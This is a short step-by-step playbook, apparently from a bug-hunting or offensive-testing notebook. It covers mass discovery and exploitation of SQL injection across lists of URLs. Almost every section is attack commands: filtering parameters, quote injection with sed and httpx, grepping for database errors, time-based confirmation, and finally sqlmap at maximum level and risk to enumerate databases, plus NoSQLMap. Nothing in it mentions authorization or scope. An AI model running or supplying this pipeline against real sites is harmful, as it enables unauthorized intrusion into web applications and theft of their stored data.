## 📥 INPUT

```
parameter.txt
```

## 1) PARAMETER CLEANING (MANDATORY)

```bash
cat parameter.txt | sort -u > params_unique.txt
grep "=" params_unique.txt > params_ready.txt
```

## 2) SQL-INTERESTING PARAMETER FILTER

```bash
grep -Ei "id=|uid=|pid=|cat=|page=|item=|product=|order=|sort=|type=|ref=|search=|query=|name=" params_ready.txt > sqli_candidates.txt
```

## 3) FAST MASS DISCOVERY (LOW IMPACT)

### sqliv

```bash
python3 sqliv.py -t sqli_candidates.txt
```
Output:

```
sqli_mass_hits.txt
```

Purpose: **remove dead / boring endpoints**

## 4) BASIC ERROR-BASED CHECK

```bash
sed "s/=/='\''/" sqli_mass_hits.txt > sqli_quote_test.txt
httpx -l sqli_quote_test.txt -silent -fr -o sqli_error_responses.txt
```
## 5) EXTRACT REAL SUSPECTS

```bash
grep -Ei "SQL|syntax|mysql|ORA|PDO|SQLite|Postgre" sqli_error_responses.txt > sqli_suspects.txt
```
## 6) TIME-BASED CONFIRMATION (MOST RELIABLE)

### Blinder

```bash
python3 blinder.py -u "URL" -p param --sleep 5
```

⏱️ Delay ≥ 5s = **CONFIRMED SQLi**

Save:

```
sqli_confirmed.txt
```
## 7) FINAL PROOF (SQLMAP ONLY AT THE END)

### Single Target

```bash
sqlmap -u "URL" --batch --level=5 --risk=3 --dbs
```
### Multiple Targets

```bash
sqlmap -m sqli_confirmed.txt --batch --level=5 --risk=3
```
## 🧬 8) NOSQL CHECK (ONLY IF APP USES MONGO)

### NoSQLMap

```bash
python3 nosqlmap.py
```
